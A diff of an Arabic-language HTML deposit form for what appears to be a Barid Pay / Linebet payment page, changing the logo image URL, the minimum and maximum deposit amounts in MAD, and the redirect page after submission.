@@ -27,7 +27,6 @@
       box-shadow: 0 0 10px rgba(0,0,0,0.2);
     }
 
-    /* زر الإغلاق × بدون دائرة */
     .exit-button {
       position: absolute;
       top: 10px;
@@ -204,7 +203,7 @@
   <a href="home.html" class="exit-button" title="إغلاق">×</a>
 
   <div class="logo-box">
-    <img src="https://i.ibb.co/xq8PQRZx/albarid-linebet.png" alt="albarid-linebet">
+    <img src="https://i.postimg.cc/05nG1rDp/barid-pay-mobcash.png" alt="albarid-linebet">
   </div>
 
   <div class="alert">
@@ -235,9 +234,9 @@
     </div>
 
     <div class="info-block">
-      <div class="info-label">:المبلغ (الحد الأدنى 100.00 / الحد الأقصى 5,000.00 MAD)</div>
+      <div class="info-label">:المبلغ (الحد الأدنى 20.00 / الحد الأقصى 10,000.00 MAD)</div>
       <div class="info-input">
-        <input type="number" name="amount" class="english-numbers" min="100" max="5000" placeholder="100.00" required>
+        <input type="number" name="amount" class="english-numbers" min="20" max="10000" placeholder="20.00" required>
       </div>
     </div>
 
@@ -346,7 +345,7 @@
       });
 
       if (response.ok) {
-        window.location.href = "al-barid-depo.html";
+        window.location.href = "barid-pay-depo.html";
       } else {
         alert("حدث خطأ أثناء إرسال البيانات.");
       }
